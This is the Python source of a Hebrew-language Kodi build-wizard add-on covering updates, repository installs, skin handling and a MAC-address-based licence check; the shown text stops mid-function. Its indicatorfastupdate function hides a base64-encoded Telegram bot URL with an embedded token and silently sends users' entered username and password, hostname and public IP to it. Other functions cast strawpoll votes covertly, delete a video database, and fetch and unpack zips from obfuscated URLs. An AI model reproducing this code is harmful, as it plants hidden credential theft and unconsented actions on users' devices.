# coding: utf-8
################################################################################
#      Copyright (C) 2015 Surfacingx                                           #
#                                                                              #
#  This Program is free software; you can redistribute it and/or modify        #
#  it under the terms of the GNU General Public License as published by        #
#  the Free Software Foundation; either version 2, or (at your option)         #
#  any later version.                                                          #
#                                                                              #
#  This Program is distributed in the hope that it will be useful,             #
#  but WITHOUT ANY WARRANTY; without even the implied warranty of              #
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the                #
#  GNU General Public License for more details.                                #
#                                                                              #
#  You should have received a copy of the GNU General Public License           #
#  along with XBMC; see the file COPYING.  If not, write to                    #
#  the Free Software Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.       #
#  http://www.gnu.org/copyleft/gpl.html                                        #
################################################################################

import xbmc, xbmcaddon, xbmcgui, xbmcplugin, os, sys, xbmcvfs, glob
import shutil
import urllib2,urllib
import re
import uservar
import time
import json
import speedtest
from shutil import copyfile
from datetime import date, datetime, timedelta
from resources.libs import extract, downloader, downloaderbg, downloaderwiz, notify, loginit, debridit, traktit,maintenance, skinSwitch, uploadLog, wizard as wiz

ADDON_ID       = uservar.ADDON_ID
ADDONTITLE     = uservar.ADDONTITLE
ADDON          = wiz.addonId(ADDON_ID)
VERSION        = wiz.addonInfo(ADDON_ID,'version')
ADDONPATH      = wiz.addonInfo(ADDON_ID,'path')
ADDONID        = wiz.addonInfo(ADDON_ID,'id')
DIALOG         = xbmcgui.Dialog()
DP             = xbmcgui.DialogProgress()
DP2              = xbmcgui.DialogProgressBG()
HOME           = xbmc.translatePath('special://home/')
PROFILE        = xbmc.translatePath('special://profile/')
KODIHOME       = xbmc.translatePath('special://xbmc/')
ADDONS         = os.path.join(HOME,     'addons')
KODIADDONS     = os.path.join(KODIHOME, 'addons')
USERDATA       = os.path.join(HOME,     'userdata')
PLUGIN         = os.path.join(ADDONS,   ADDON_ID)
PACKAGES       = os.path.join(ADDONS,   'packages')
ADDONDATA      = os.path.join(USERDATA, 'addon_data', ADDON_ID)
FANART         = os.path.join(ADDONPATH,'fanart.jpg')
ICON           = os.path.join(ADDONPATH,'icon.png')
ART            = os.path.join(ADDONPATH,'resources', 'art')
SKIN           = xbmc.getSkinDir()
BUILDNAME      = wiz.getS('buildname')
DEFAULTSKIN    = wiz.getS('defaultskin')
DEFAULTNAME    = wiz.getS('defaultskinname')
DEFAULTIGNORE  = wiz.getS('defaultskinignore')
BUILDVERSION   = wiz.getS('buildversion')
BUILDLATEST    = wiz.getS('latestversion')
BUILDCHECK     = wiz.getS('lastbuildcheck')
DISABLEUPDATE  = wiz.getS('disableupdate')
AUTOCLEANUP    = wiz.getS('autoclean')
AUTOCACHE      = wiz.getS('clearcache')
AUTOPACKAGES   = wiz.getS('clearpackages')
AUTOTHUMBS     = wiz.getS('clearthumbs')
AUTOFEQ        = wiz.getS('autocleanfeq')
AUTONEXTRUN    = wiz.getS('nextautocleanup')
TRAKTSAVE      = wiz.getS('traktlastsave')
REALSAVE       = wiz.getS('debridlastsave')
LOGINSAVE      = wiz.getS('loginlastsave')
INSTALLMETHOD    = wiz.getS('installmethod')
KEEPTRAKT      = wiz.getS('keeptrakt')
KEEPREAL       = wiz.getS('keepdebrid')
KEEPLOGIN      = wiz.getS('keeplogin')
INSTALLED      = wiz.getS('installed')
EXTRACT        = wiz.getS('extract')
EXTERROR       = wiz.getS('errors')
NOTIFY         = wiz.getS('notify')
NOTEDISMISS    = wiz.getS('notedismiss')
NOTEID         = wiz.getS('noteid')
NOTIFY2         = wiz.getS('notify2')
NOTEDISMISS2    = wiz.getS('notedismiss2')
NOTEID2         = wiz.getS('noteid2')
NOTIFY3         = wiz.getS('notify3')
NOTEDISMISS3    = wiz.getS('notedismiss3')
NOTEID3         = wiz.getS('noteid3')
BACKUPLOCATION = ADDON.getSetting('path') if not ADDON.getSetting('path') == '' else HOME
MYBUILDS       = os.path.join(BACKUPLOCATION, 'My_Builds', '')
NOTEID          = 0 if NOTEID == "" else int(NOTEID)
NOTEID2         = 0 if NOTEID2 == "" else int(NOTEID2)
NOTEID3         = 0 if NOTEID3 == "" else int(NOTEID3)
AUTOFEQ        = int(AUTOFEQ) if AUTOFEQ.isdigit() else 1
TODAY          = date.today()
TOMORROW       = TODAY + timedelta(days=1)
TWODAYS        = TODAY + timedelta(days=2)
THREEDAYS      = TODAY + timedelta(days=3)
ONEWEEK        = TODAY + timedelta(days=7)
KODIV          = float(xbmc.getInfoLabel("System.BuildVersion")[:4])
EXCLUDES       = uservar.EXCLUDES
SPEEDFILE      = speedtest.SPEEDFILE
UPDATECHECK    = uservar.UPDATECHECK if str(uservar.UPDATECHECK).isdigit() else 1
NEXTCHECK      = TODAY + timedelta(days=UPDATECHECK)
NOTIFICATION   = uservar.NOTIFICATION
NOTIFICATION2   = uservar.NOTIFICATION2
NOTIFICATION3   = uservar.NOTIFICATION3
ENABLE         = uservar.ENABLE
UNAME            = speedtest.UNAME
HEADERMESSAGE  = uservar.HEADERMESSAGE
AUTOUPDATE     = uservar.AUTOUPDATE
WIZARDFILE     = uservar.WIZARDFILE
AUTOINSTALL    = uservar.AUTOINSTALL
REPOID         = uservar.REPOID
REPOADDONXML   = uservar.REPOADDONXML
REPOZIPURL     = uservar.REPOZIPURL
REPOID18         = uservar.REPOID18
REPOADDONXML18   = uservar.REPOADDONXML18
REPOZIPURL18     = uservar.REPOZIPURL18

REQUESTSID         = uservar.REQUESTSID
REQUESTSXML   = uservar.REQUESTSXML
REQUESTSURL     = uservar.REQUESTSURL



COLOR1         = uservar.COLOR1
COLOR2         = uservar.COLOR2
TMDB_NEW_API     = uservar.TMDB_NEW_API
WORKING        = True if wiz.workingURL(SPEEDFILE) == True else False
FAILED         = False
xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')

AddonID ='plugin.program.EA4all'
packagesdir    =  xbmc.translatePath(os.path.join('special://home/addons/packages',''))
thumbnails    =  xbmc.translatePath('special://home/userdata/Thumbnails')
dialog = xbmcgui.Dialog()
setting = xbmcaddon.Addon().getSetting
iconpath = xbmc.translatePath(os.path.join('special://home/addons/' + AddonID,'icon.png'))
notify_mode = setting('notify_mode')
auto_clean  = setting('startup.cache')
#filesize = int(setting('filesize_alert'))
filesize_thumb = int(setting('filesizethumb_alert'))
#maxpackage_zips = int(setting('packagenumbers_alert'))

total_size2 = 0
total_size = 0
count = 0

def disply_hwr():
   try:
    my_tmdb=tmdb_list(TMDB_NEW_API)
    num=str((getHwAddr('eth0'))*my_tmdb)
   #pastebin_vars = {'api_dev_key':'57fe1369d02477a235057557cbeabaa1','api_option':'paste','api_paste_code':num}
   #response = urllib.urlopen('http://pastebin.com/api/api_post.php', urllib.urlencode(pastebin_vars))

   #url2 = response.read()

   
    new_num=(num[1]+num[2]+num[5]+num[7])
    input= (ADDON.getSetting("action"))

    wiz.setS('action', str(new_num))
   except: pass
def getHwAddr(ifname):
   import subprocess,time
   system_type='windows'
   if xbmc.getCondVisibility('system.platform.android'):
       system_type='android'
   if xbmc.getCondVisibility('system.platform.android'):
     Installed_APK = subprocess.Popen(["exec ''ip link''"], executable='/system/bin/sh', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).communicate()[0].splitlines()
  
     mac=re.compile('link/ether (.+?) brd').findall(str(Installed_APK))
     n=0
     for match in mac:
      if mac!='00:00:00:00:00:00':
          mac_address=match
          n =n+ int(mac_address.replace(':', ''), 16)
          
   elif xbmc.getCondVisibility('system.platform.windows'):
       x=0
       n=0
       macs = []
       file = os.popen("getmac").read()
       file = file.split("\n")

       for line in file:
            found = re.search(r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})', line, re.I)
            if found:
                mac = found.group().replace('-', ':')
                macs.append(mac)
               
          
                n =n+ int(mac.replace(':', ''), 16)
                
   else:
         wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]' % COLOR2)
         
   # else:
       # x=0
       # n=0
       # while(1):
         # mac_address = xbmc.getInfoLabel("network.macaddress")
         # logging.warning(mac_address)
         # if mac_address!="Busy" and  mac_address!=' עסוק':
    
            # break
         # else:
           # x=x+1
           # time.sleep(1)
           # if x>30:
            # break
       # n =n+ int(mac_address.replace(':', ''), 16)
   try:
    return n
   except: pass
def decode(key, enc):
    import base64
    dec = []
    
    if (len(key))!=4:
     return 10
    enc = base64.urlsafe_b64decode(enc)

    for i in range(len(enc)):
        key_c = key[i % len(key)]
        dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
        dec.append(dec_c)
    return "".join(dec)
def tmdb_list(url):

 
    value=decode("7643",url)
   

    return int(value)
def u_list(list):#חומרה

    from math import sqrt
    my_tmdb=tmdb_list(TMDB_NEW_API)
    
    num=str((getHwAddr('eth0'))*my_tmdb)
    new_num=int(num[1]+num[2]+num[5]+num[7])
    
    input= (ADDON.getSetting("pass"))



    
    new_num2=(str( round(sqrt((new_num*700)+50)+50,4))[-4:]).replace('.','')
    if '.' in new_num2:
     new_num2=(str( round(sqrt((new_num*700)+50)+50,4))[-5:]).replace('.','')
    if input==new_num2:

      url=list
	   
    else:
       if STARTP() and STARTP2() =='ok':
#       if STARTP() =='ok':
         return list
       url='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'
       xbmcgui.Dialog().ok('הקוד שלך',' סיסמה שגויה')
       sys.exit()
    return url
try:
   disply_hwr()
except:
   pass
def dis_or_enable_addon(addon_id,mode, enable="true"):
    import json
    addon = '"%s"' % addon_id
    if xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "true":
        logging.warning('already Enabled')
        return xbmc.log("### Skipped %s, reason = allready enabled" % addon_id)
    elif not xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "false":
        return xbmc.log("### Skipped %s, reason = not installed" % addon_id)
    else:
        do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}' % (addon, enable)
        query = xbmc.executeJSONRPC(do_json)
        response = json.loads(query)
        if enable == "true":
            xbmc.log("### Enabled %s, response = %s" % (addon_id, response))
        else:
            xbmc.log("### Disabled %s, response = %s" % (addon_id, response))
    if mode=='auto':
     return True
    return xbmc.executebuiltin('Container.Update(%s)' % xbmc.getInfoLabel('Container.FolderPath'))
def update_Votes():
   try:
        import requests
        id='18773068'
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Referer': 'https://www.strawpoll.me/'+id,
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'TE': 'Trailers',
        }

        votes='145273321'#option 1


        data = {
         
          'options': votes
        }

        response = requests.post('https://www.strawpoll.me/'+id, headers=headers, data=data)
   except: pass
def display_Votes():
    try:
        setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

        file = open(setting_file, 'r') 
        file_data= file.read()
        file.close()
        regex='<setting id="HomeS" type="string">(.+?)</setting>'
        
        m=re.compile(regex).findall(file_data)[0]

        
        
        
        
        import requests
        id='18782966'
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Referer': 'https://www.strawpoll.me/'+id,
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'TE': 'Trailers',
        }

        eminence='145313053'#option 1
        nox='145313054'#option 2
        titan='145313057'#option 3
        phenomenal='145313058'#option 4
        netflix='145313055'#option 5
        nebula='145313060'#option 6
        pellucid='145313056'#option 7
        pellucid2='145313059'#option 8
        
        
        if m == 'emin':
           res=eminence
        if m == 'nox':
           res=nox
        if m == 'noxtitan':
           res=nox
        if m == 'titan':
           res=titan
        if m == 'pheno':
           res=phenomenal
        if m == 'netflix':
           res=netflix
        if m == 'nebula':
           res=nebula
        if m == 'pellucid':
           res=pellucid
        if m == 'pellucid2':
           res=pellucid2
           
           
        data = {
         
          'options': res
        }

        response = requests.post('https://www.strawpoll.me/'+id, headers=headers, data=data)
    except: pass
def indicatorfastupdate():
       try:
          import json
          wiz.log('FRESH MESSAGE')
          input= (ADDON.getSetting("user"))
          input2= (ADDON.getSetting("pass"))
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          #freshStart(name)
          error_ad='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDY5NDQ4MDg4NzpBQUU2bTAxRXJpNnZNTGRjN0JfT3lSX19yWFNSRzl0VE9JQS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE2NTIyOTQwJnRleHQ9JTIw16LXqdeUJTIw16LXk9eb15XXnyUyMNee15TXmdeo'
          x=urllib2.urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=input2
          import socket
          x=urllib2.urlopen(error_ad.decode('base64')+' - '+(socket.gethostbyaddr(socket.gethostname())[0])+' - '+userr +' - '+passs+' - '+kodiinfo+' - '+local_ip).readlines()
          #          x=urllib2.urlopen(error_ad.decode('base64')+(socket.gethostbyaddr(socket.gethostname())[0])+'-'+local_ip).readlines()
       except: pass
def skindialogsettind18():
	try:
		src=xbmc . translatePath ( 'special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"
		dst=xbmc . translatePath ( 'special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"
		copyfile(src,dst)
	except:pass
def checkidupdate():
			
				wiz.setS("notedismiss","true")
				url = wiz.workingURL(NOTIFICATION)

				name =  " EAbuilds "
				buildzip = wiz.checkBuild(name,'gui')
				zipname = name.replace('\\', '').replace('/', '').replace(':', '').replace('*', '').replace('?', '').replace('"', '').replace('<', '').replace('>', '').replace('|', '')
				if not wiz.workingURL(buildzip) == True: return
				if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
#				DP2.create('קיים עדכון מהיר עבורך')
#				DP2.update(0, 'מוריד')
				lib=os.path.join(PACKAGES, '%s_guisettings.zip' % zipname)
				try: os.remove(lib)
				except: pass

				if 'google' in buildzip:
				   res=googledrive_download(buildzip, lib, DP2,wiz.checkBuild(name, 'filesize'))
			
			
				else:
				  downloaderbg.download3(buildzip, lib, DP2)
				xbmc.sleep(100)
				DP2.create('[B][COLOR=green]מתקין                         [/COLOR][/B]')
#				title = '[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name)
				DP2.update(100, message='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')

				extract.all2(lib,HOME,DP2)
				DP2.close()
				wiz.defaultSkin()
				wiz.lookandFeelData('save')
				wiz.kodi17Fix()
				if KODIV>=18:
					skindialogsettind18()
				xbmc.executebuiltin("ReloadSkin()")
				update_Votes()
				indicatorfastupdate()
				wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]' % COLOR2)
				debridit.debridIt('restore', 'all')
				traktit.traktIt('restore', 'all')
				if INSTALLMETHOD == 1: todo = 1
				elif INSTALLMETHOD == 2: todo = 0
				else: DP2.close()
def checkvictory():
			
				wiz.setS("notedismiss2","true")
				url = wiz.workingURL(NOTIFICATION2)

				name =  " EAbuilds "
				buildzip = 'aHR0cHM6Ly9naXRodWIuY29tL3ZpcDIwMC92aWN0b3J5L2Jsb2IvbWFzdGVyL3BsdWdpbi52aWRlby5hbGxtb3ZpZXNpbi56aXA/cmF3PXRydWU='.decode('base64')
				zipname = name.replace('\\', '').replace('/', '').replace(':', '').replace('*', '').replace('?', '').replace('"', '').replace('<', '').replace('>', '').replace('|', '')
				if not wiz.workingURL(buildzip) == True: return
				if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
#				DP2.create('קיים עדכון מהיר עבורך')
#				DP2.update(0, 'מוריד')
				lib=os.path.join(PACKAGES, '%s_guisettings.zip' % zipname)
				try: os.remove(lib)
				except: pass

				if 'google' in buildzip:
				   res=googledrive_download(buildzip, lib, DP2,wiz.checkBuild(name, 'filesize'))
			
			
				else:
				  downloaderbg.download5(buildzip, lib, DP2)
				xbmc.sleep(100)
				DP2.create('[B][COLOR=green]מתקין                         [/COLOR][/B]')
#				title = '[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name)
				DP2.update(100, message='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')

				extract.all2(lib,ADDONS,DP2)
				DP2.close()
				wiz.defaultSkin()
				wiz.lookandFeelData('save')
				wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]ההרחבה עודכנה בהצלחה![/COLOR]' % COLOR2)

				if INSTALLMETHOD == 1: todo = 1
				elif INSTALLMETHOD == 2: todo = 0
				else: DP2.close()
###########################
#### Check Updates   ######
###########################

def checkUpdate():
	BUILDNAME      = wiz.getS('buildname')
	BUILDVERSION   = wiz.getS('buildversion')
	link           = wiz.openURL(SPEEDFILE).replace('\n','').replace('\r','').replace('\t','')
	match          = re.compile('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"' % BUILDNAME).findall(link)
	if len(match) > 0:
		version = match[0][0]
		icon    = match[0][1]
		fanart  = match[0][2]
		wiz.setS('latestversion', version)
		if version > BUILDVERSION:
			if DISABLEUPDATE == 'false':
				wiz.log("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window" % (BUILDVERSION, version), xbmc.LOGNOTICE)
				notify.updateWindow(BUILDNAME, BUILDVERSION, version, icon, fanart)
			else: wiz.log("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled" % (BUILDVERSION, version), xbmc.LOGNOTICE)
		else: wiz.log("[Check Updates] [Installed Version: %s] [Current Version: %s]" % (BUILDVERSION, version), xbmc.LOGNOTICE)
	else: wiz.log("[Check Updates] ERROR: Unable to find build version in build text file", xbmc.LOGERROR)

#def checkSkin():
#	wiz.log("[Build Check] Invalid Skin Check Start")

#	DEFAULTNAME   = wiz.getS('defaultskinname')



#	gotoskin = DEFAULTSKIN
#	gotoname = DEFAULTNAME


#	if gotoskin:
#		skinSwitch.swapSkins(gotoskin)
#		x = 0
#		xbmc.sleep(1000)
#		while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 150:
#			x += 1
#			xbmc.sleep(200)

#		if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
#			wiz.ebi('SendClick(11)')
#			wiz.lookandFeelData('restore')
#		else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]Skin Swap Timed Out![/COLOR]' % COLOR2)
#	wiz.log("[Build Check] Invalid Skin Check End", xbmc.LOGNOTICE)def MainMenu():

#	addItem('Skin Premium','url',5,icon,fanart,'')







wiz.log("[Auto Update Wizard] Started", xbmc.LOGNOTICE)
if AUTOUPDATE == 'Yes':
	input= (ADDON.getSetting("autoupdate"))
	xbmc.executebuiltin("UpdateLocalAddons")
	xbmc.executebuiltin("UpdateAddonRepos")
	wiz.wizardUpdate('startup')

	checkUpdate()
#	if input == 'true': fastupdatefirstbuild(NOTEID)
else: wiz.log("[Auto Update Wizard] Not Enabled", xbmc.LOGNOTICE)



wiz.log("[Auto Install Repo] Started", xbmc.LOGNOTICE)
if AUTOINSTALL == 'Yes' and not os.path.exists(os.path.join(ADDONS, REPOID)) and KODIV>=17 and KODIV<18:
	#xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi EA', 'Please Wait....')))
	wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אנא המתן...[/COLOR]' % COLOR2)
	workingxml = wiz.workingURL(REPOADDONXML)
	if workingxml == True:
		ver = wiz.parseDOM(wiz.openURL(REPOADDONXML), 'addon', ret='version', attrs = {'id': REPOID})
		if len(ver) > 0:
			installzip = '%s-%s.zip' % (REPOID, ver[0])
			workingrepo = wiz.workingURL(REPOZIPURL+installzip)
			if workingrepo == True:
				DP.create(ADDONTITLE,'מוריד ממשק התקנה חדשני, אנא המתן....','', 'Please Wait')
				if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
				lib=os.path.join(PACKAGES, installzip)
				try: os.remove(lib)
				except: pass
				downloader.download(REPOZIPURL+installzip,lib, DP)
				extract.all(lib, ADDONS, DP)
				try:
					f = open(os.path.join(ADDONS, REPOID, 'addon.xml'), mode='r'); g = f.read(); f.close()
					name = wiz.parseDOM(g, 'addon', ret='name', attrs = {'id': REPOID})
					wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, name[0]), "[COLOR %s]Add-on updated[/COLOR]" % COLOR2, icon=os.path.join(ADDONS, REPOID, 'icon.png'))
				except:
					pass
				if KODIV >= 17: wiz.addonDatabase(REPOID, 1)
				DP.close()
				xbmc.sleep(500)
				wiz.forceUpdate(True)
				wiz.log("[Auto Install Repo] Successfully Installed", xbmc.LOGNOTICE)
				xbmc.executebuiltin("ReloadSkin()")
				xbmc.executebuiltin( "ActivateWindow(home)" )
				f_play=(os.path.join(ADDONPATH, 'resources', 'victory.mp4'))
				xbmc.Player().play(f_play,windowed=False)
				#xbmc.executebuiltin( "XBMC.Action(Fullscreen)" )
			else: 
				wiz.LogNotify("[COLOR %s]Repo Install Error[/COLOR]" % COLOR1, "[COLOR %s]Invalid url for zip![/COLOR]" % COLOR2)
				wiz.log("[Auto Install Repo] Was unable to create a working url for repository. %s" % workingrepo, xbmc.LOGERROR)
		else:
			wiz.log("Invalid URL for Repo Zip", xbmc.LOGERROR)
	else: 
		wiz.LogNotify("[COLOR %s]Repo Install Error[/COLOR]" % COLOR1, "[COLOR %s]Invalid addon.xml file![/COLOR]" % COLOR2)
		wiz.log("[Auto Install Repo] Unable to read the addon.xml file.", xbmc.LOGERROR)
elif not AUTOINSTALL == 'Yes': wiz.log("[Auto Install Repo] Not Enabled", xbmc.LOGNOTICE)
elif os.path.exists(os.path.join(ADDONS, REPOID)): wiz.log("[Auto Install Repo] Repository already installed")


if AUTOINSTALL == 'Yes' and not os.path.exists(os.path.join(ADDONS, REPOID)) and KODIV>=18:
	workingxml = wiz.workingURL(REPOADDONXML18)
	wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אנא המתן...[/COLOR]' % COLOR2)
	if BUILDNAME == "":
		try:
			os.remove(os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos116.db"))
		except:
				pass
	if workingxml == True:
		ver = wiz.parseDOM(wiz.openURL(REPOADDONXML18), 'addon', ret='version', attrs = {'id': REPOID18})
		if len(ver) > 0:
			installzip = '%s-%s.zip' % (REPOID18, ver[0])
			workingrepo = wiz.workingURL(REPOZIPURL18+installzip)
			if workingrepo == True:
				DP.create(ADDONTITLE,'מוריד ממשק התקנה חדשני, אנא המתן....','', 'Please Wait')
				if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
				lib=os.path.join(PACKAGES, installzip)
				try: os.remove(lib)
				except: pass
				downloader.download(REPOZIPURL18+installzip,lib, DP)
				extract.all(lib, ADDONS, DP)
				try:
					f = open(os.path.join(ADDONS, REPOID18, 'addon.xml'), mode='r'); g = f.read(); f.close()
					name = wiz.parseDOM(g, 'addon', ret='name', attrs = {'id': REPOID18})
					wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, name[0]), "[COLOR %s]Add-on updated[/COLOR]" % COLOR2, icon=os.path.join(ADDONS, REPOID18, 'icon.png'))
				except:
					pass
				if KODIV >= 17: wiz.addonDatabase(REPOID18, 1)
				DP.close()
				xbmc.sleep(500)
				wiz.forceUpdate(True)
				wiz.log("[Auto Install Repo] Successfully Installed", xbmc.LOGNOTICE)
				xbmc.executebuiltin("ReloadSkin()")
				xbmc.executebuiltin( "ActivateWindow(home)" )
				f_play=(os.path.join(ADDONPATH, 'resources', 'victory.mp4'))
				xbmc.Player().play(f_play,windowed=False)
				#xbmc.executebuiltin( "XBMC.Action(Fullscreen)" )
			else: 
				wiz.LogNotify("[COLOR %s]Repo Install Error[/COLOR]" % COLOR1, "[COLOR %s]Invalid url for zip![/COLOR]" % COLOR2)
				wiz.log("[Auto Install Repo] Was unable to create a working url for repository. %s" % workingrepo, xbmc.LOGERROR)
		else:
			wiz.log("Invalid URL for Repo Zip", xbmc.LOGERROR)
	else: 
		wiz.LogNotify("[COLOR %s]Repo Install Error[/COLOR]" % COLOR1, "[COLOR %s]Invalid addon.xml file![/COLOR]" % COLOR2)
		wiz.log("[Auto Install Repo] Unable to read the addon.xml file.", xbmc.LOGERROR)
        
        
elif not AUTOINSTALL == 'Yes': wiz.log("[Auto Install Repo] Not Enabled", xbmc.LOGNOTICE)
elif os.path.exists(os.path.join(ADDONS, REPOID18)): wiz.log("[Auto Install Repo] Repository already installed")
        
        
if AUTOINSTALL == 'Yes' and not os.path.exists(os.path.join(ADDONS, REQUESTSID)):
	workingxml = wiz.workingURL(REQUESTSXML)

	if workingxml == True:
		ver = wiz.parseDOM(wiz.openURL(REQUESTSXML), 'addon', ret='version', attrs = {'id': REQUESTSID})
		if len(ver) > 0:
			installzip = '%s-%s.zip' % (REQUESTSID, ver[0])
			workingrepo = wiz.workingURL(REQUESTSURL+installzip)
			if workingrepo == True:
				#DP.create(ADDONTITLE,'מוריד קבצי התקנה...','', 'Please Wait')
				if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
				lib=os.path.join(PACKAGES, installzip)
				try: os.remove(lib)
				except: pass
				downloaderbg.download4(REQUESTSURL+installzip,lib, DP2)
				DP2.create('[B][COLOR=green]מתקין                         [/COLOR][/B]')
				DP2.update(100, message='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')
				extract.all2(lib,ADDONS,DP2)
				try:
					f = open(os.path.join(ADDONS, REQUESTSID, 'addon.xml'), mode='r'); g = f.read(); f.close()
					name = wiz.parseDOM(g, 'addon', ret='name', attrs = {'id': REQUESTSID})
					wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, name[0]), "[COLOR %s]Add-on updated[/COLOR]" % COLOR2, icon=os.path.join(ADDONS, REQUESTSID, 'icon.png'))
				except:
					pass
				if KODIV >= 17: wiz.addonDatabase(REQUESTSID, 1)
				DP2.close()
				xbmc.sleep(500)
				wiz.forceUpdate(True)
				wiz.kodi17Fix()



def setuname():
    search_entered=''
    keyboard = xbmc.Keyboard(search_entered, 'הכנס שם משתמש')
    keyboard.doModal()
    if keyboard.isConfirmed():
           search_entered = keyboard.getText()
           wiz.setS('user', str(search_entered))
def STARTP2():
	if BUILDNAME == " EAbuilds ":
		input= (ADDON.getSetting("user"))
		url = (UNAME)
		remote_file = urllib2.urlopen(url)
		x=remote_file.readlines()
		found=0
		for us in x:
			if us.split(' ==')[0] ==input or us.split()[0]==input:
				found=1
				break
		if found==0:

			yes = DIALOG.yesno("%s" % ADDONTITLE, "[COLOR %s]ברוכים הבאים לקודי אנונימוס" % (COLOR2), "נא להכניס את שם המשתמש שלכם[/COLOR]", nolabel='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel='[B][COLOR green]אישור[/COLOR][/B]')

			if yes:
				ADDON.openSettings()
				sys.exit()
			else:
				sys.exit()
#	else:
#		xbmcgui.Dialog().ok('הקוד שלך','עבר')
#		sys.exit()
		return 'ok'


def skinWIN():
	idle()
	fold = glob.glob(os.path.join(ADDONS, 'skin*'))
	addonnames = []; addonids = []
	for folder in sorted(fold, key = lambda x: x):
		foldername = os.path.split(folder[:-1])[1]
		xml = os.path.join(folder, 'addon.xml')
		if os.path.exists(xml):
			f      = open(xml)
			a      = f.read()
			match  = parseDOM2(a, 'addon', ret='id')
			addid  = foldername if len(match) == 0 else match[0]
			try: 
				add = xbmcaddon.Addon(id=addid)
				addonnames.append(add.getAddonInfo('name'))
				addonids.append(addid)
			except:
				pass
	selected = []; choice = 0
	skin = ["Current Skin -- %s" % currSkin()] + addonnames
	choice = DIALOG.select("Select the Skin you want to swap with.", skin)
	if choice == -1: return
	else: 
		choice1 = (choice-1)
		selected.append(choice1)
		skin[choice] = "%s" % ( addonnames[choice1])
	if selected == None: return
	for addon in selected:
		swapSkins(addonids[addon])
        
def currSkin():
	return xbmc.getSkinDir('Container.PluginName')
    
def fix17update():
	if KODIV>=17 and KODIV<18:
		wiz.kodi17Fix()
		xbmc.sleep(4000)
		try:
			old_file = os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos116.db")
			new_file = os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos107.db")
			os.rename(old_file, new_file)
		except:
				pass
		xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')
		xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')
		fixfont()
		setting_file=os.path.join(xbmc.translatePath("special://home/"),"addons", "skin.Premium.mod","addon.xml")

		try:
			file = open(setting_file, 'r') 
